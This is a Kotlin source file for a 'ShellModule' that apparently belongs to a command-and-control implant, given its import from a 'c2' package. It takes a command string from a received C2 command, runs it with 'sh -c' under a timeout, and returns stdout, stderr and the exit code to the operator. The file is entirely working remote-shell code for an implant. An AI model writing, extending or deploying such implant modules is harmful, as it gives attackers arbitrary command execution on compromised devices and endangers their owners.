package org.synapse.core.modules

import org.synapse.core.c2.Command
import org.synapse.core.core.SynapseResponse
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.BufferedReader
import java.io.InputStreamReader

object ShellModule {

    suspend fun exec(cmd: Command): SynapseResponse = withContext(Dispatchers.IO) {
        val command = cmd.params["cmd"] ?: "id"
        val timeout = (cmd.params["timeout"]?.toIntOrNull() ?: 10) * 1000L

        try {
            val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", command))
            val reader = BufferedReader(InputStreamReader(process.inputStream))
            val errReader = BufferedReader(InputStreamReader(process.errorStream))
            val stdout = StringBuilder()
            val stderr = StringBuilder()

            val finished = process.waitFor(timeout, java.util.concurrent.TimeUnit.MILLISECONDS)
            if (!finished) {
                process.destroyForcibly()
                return@withContext SynapseResponse.ErrorResponse(error = "timeout", module = "shell")
            }

            var line: String?
            while (reader.readLine().also { line = it } != null) stdout.appendLine(line)
            while (errReader.readLine().also { line = it } != null) stderr.appendLine(line)

            val exitCode = process.exitValue()

            SynapseResponse.ShellResponse(
                exit_code = exitCode,
                stdout = stdout.toString().trim(),
                stderr = stderr.toString().trim()
            )
        } catch (e: Exception) {
            SynapseResponse.ErrorResponse(error = "shell:${e.message}", module = "shell")
        }
    }
}
